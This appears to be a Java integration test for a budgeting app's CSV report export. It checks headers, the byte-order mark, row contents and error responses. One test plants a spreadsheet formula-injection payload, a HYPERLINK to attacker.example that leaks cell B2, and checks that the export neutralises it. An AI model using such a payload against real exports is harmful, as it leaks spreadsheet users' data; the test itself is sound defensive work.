package com.budgetowl.api;

import static org.assertj.core.api.Assertions.assertThat;

import java.nio.charset.StandardCharsets;
import java.util.Arrays;
import java.util.UUID;
import org.junit.jupiter.api.BeforeEach;
import org.junit.jupiter.api.Test;
import org.junit.jupiter.params.ParameterizedTest;
import org.junit.jupiter.params.provider.ValueSource;
import tools.jackson.databind.JsonNode;

/**
 * The CSV representation end to end: its headers, its rows, and the formula-injection control on a
 * name that went in through the real category endpoint (docs/features/reporting.md, CSV export and
 * attack 3). {@code CsvWriterTest} proves the writer; this proves the report uses it for the right
 * columns.
 */
class ReportCsvIT extends ReportTestBase {

    private static final String PAYLOAD = "=HYPERLINK(\"https://attacker.example/?\"&B2,\"Open\")";
    private static final String CSV = "text/csv";

    private Household household;
    private UUID current;

    @BeforeEach
    void seedAHousehold() {
        household = seedHousehold();
        current = account(household.owner(), "Current", "GBP");
    }

    @ParameterizedTest(name = "{0}")
    @ValueSource(strings = {"income-and-spending", "spending-by-category"})
    void isAnAttachmentNamedOnlyFromTheReportAndThePeriodsAndNeverCached(String report) {
        ApiResponse response =
                household
                        .owner()
                        .getAccepting("/api/reports/" + report + "?from=2025-09&to=2026-08", CSV);

        assertThat(response.status()).isEqualTo(200);
        assertThat(response.header("Content-Type")).get().asString().startsWith("text/csv");
        assertThat(response.header("Content-Type")).get().asString().containsIgnoringCase("utf-8");
        assertThat(response.header("Content-Disposition"))
                .contains("attachment; filename=\"budget-owl-" + report + "-2025-09-2026-08.csv\"");
        assertThat(response.header("Cache-Control")).get().asString().contains("no-store");
        assertThat(response.header("X-Content-Type-Options")).contains("nosniff");
    }

    @Test
    void neverPutsAHouseholdOrCategoryNameInAHeader() {
        createCategory(household.owner(), "Therapy", "EXPENSE", null);
        createTransaction(
                household.owner(), current, "2026-08-02", "-80.00", seededCategoryId("Therapy"));

        ApiResponse response =
                household
                        .owner()
                        .getAccepting(
                                "/api/reports/spending-by-category?from=2026-08&to=2026-08", CSV);

        assertThat(response.headers().toString())
                .doesNotContain("Therapy")
                .doesNotContain("Ada and Grace");
        assertThat(response.body()).contains("Therapy");
    }

    @Test
    void startsWithAByteOrderMark() {
        byte[] file =
                household
                        .owner()
                        .getBytes("/api/reports/income-and-spending?from=2026-08&to=2026-08", CSV);

        assertThat(Arrays.copyOf(file, 3)).containsExactly((byte) 0xEF, (byte) 0xBB, (byte) 0xBF);
    }

    @Test
    void incomeAndSpendingIsExactlyTheTablesRows() {
        createTransaction(
                household.owner(), current, "2026-07-01", "2400.00", seededCategoryId("Salary"));
        createTransaction(
                household.owner(), current, "2026-08-03", "-61.20", seededCategoryId("Groceries"));
        createTransaction(household.owner(), current, "2026-08-04", "-9.99", null);
        readAt(IN_AUGUST_2026);

        String file =
                withoutBom(
                        household
                                .owner()
                                .getBytes(
                                        "/api/reports/income-and-spending?from=2026-07&to=2026-08",
                                        CSV));

        assertThat(file)
                .isEqualTo(
                        "\"currency\",\"period\",\"income\",\"spending\",\"uncategorisedIn\","
                                + "\"uncategorisedOut\",\"kept\",\"complete\"\r\n"
                                + "\"GBP\",\"2026-07\",\"2400.0000\",\"0.0000\",\"0.0000\","
                                + "\"0.0000\",\"2400.0000\",\"true\"\r\n"
                                + "\"GBP\",\"2026-08\",\"0.0000\",\"61.2000\",\"0.0000\","
                                + "\"9.9900\",\"-71.1900\",\"false\"\r\n");
    }

    @Test
    void theCsvAndTheJsonCarryTheSameFigures() {
        createTransaction(
                household.owner(), current, "2026-08-03", "-61.20", seededCategoryId("Groceries"));
        createTransaction(
                household.owner(), current, "2026-08-07", "-14.05", seededCategoryId("Utilities"));

        JsonNode json = spendingByCategory(household.owner(), "2026-08", "2026-08");
        String file =
                withoutBom(
                        household
                                .owner()
                                .getBytes(
                                        "/api/reports/spending-by-category?from=2026-08&to=2026-08",
                                        CSV));

        JsonNode gbp = currency(json, "GBP");
        assertThat(file)
                .contains(
                        "\"GBP\",\"2026-08\",\"2026-08\",\"2026-07\",\"2026-07\",\"CATEGORY\","
                                + "\"Groceries\",\"\",\"false\",\""
                                + text(category(gbp, "Groceries"), "spending")
                                + "\"")
                .contains(
                        "\"SUBCATEGORY\",\"Utilities\",\"Bills\",\"false\",\"14.0500\",\"0.0000\","
                                + "\"\"")
                .contains("\"UNCATEGORISED\",\"\",\"\",\"\",\"0.0000\",\"\",\"\",\"\",\"\",\"0\"");
    }

    @Test
    void escapesAFormulaInACategoryNameTypedThroughTheApi() {
        UUID hostile =
                createCategory(household.owner(), PAYLOAD.replace("\"", "\\\""), "EXPENSE", null);
        createTransaction(household.owner(), current, "2026-08-03", "-5.00", hostile);

        String file =
                withoutBom(
                        household
                                .owner()
                                .getBytes(
                                        "/api/reports/spending-by-category?from=2026-08&to=2026-08",
                                        CSV));

        assertThat(file)
                .contains("\"'=HYPERLINK(\"\"https://attacker.example/?\"\"&B2,\"\"Open\"\")\"")
                .doesNotContain(",\"=HYPERLINK");
    }

    @Test
    void escapesACategoryNamedLikeANegativeNumberButLeavesTheNegativeAmountANumber() {
        UUID minusFive = createCategory(household.owner(), "-5", "EXPENSE", null);
        createTransaction(household.owner(), current, "2026-08-03", "5.00", minusFive);

        String file =
                withoutBom(
                        household
                                .owner()
                                .getBytes(
                                        "/api/reports/spending-by-category?from=2026-08&to=2026-08",
                                        CSV));

        assertThat(file).contains("\"CATEGORY\",\"'-5\",\"\",\"false\",\"-5.0000\"");
    }

    @Test
    void anErrorIsStillAProblemDocumentWhenTheCallerAskedForCsv() {
        ApiResponse response =
                household
                        .owner()
                        .getAccepting(
                                "/api/reports/income-and-spending?from=2026-09&to=2026-08", CSV);

        assertThat(response.status()).isEqualTo(422);
        assertThat(response.header("Content-Type")).get().asString().contains("problem+json");
        assertThat(response.header("Content-Disposition")).isEmpty();
    }

    private static String withoutBom(byte[] file) {
        return new String(file, 3, file.length - 3, StandardCharsets.UTF_8);
    }
}
